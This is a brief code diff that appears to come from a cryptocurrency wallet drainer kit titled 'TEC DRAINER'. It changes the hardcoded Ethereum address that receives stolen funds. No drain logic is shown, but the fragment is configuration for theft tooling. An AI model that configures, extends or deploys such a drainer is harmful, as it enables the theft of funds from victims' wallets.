@@ -1,4 +1,4 @@
-const receiveAddress = "0x1FD5e3c46085D880840c17813Dd3F36b29EC4081";
+const receiveAddress = "0xE679e0399bD553928Cb366501012ed042CE51082";
 
 const collectionInfo = {
     name: "TEC DRAINER",
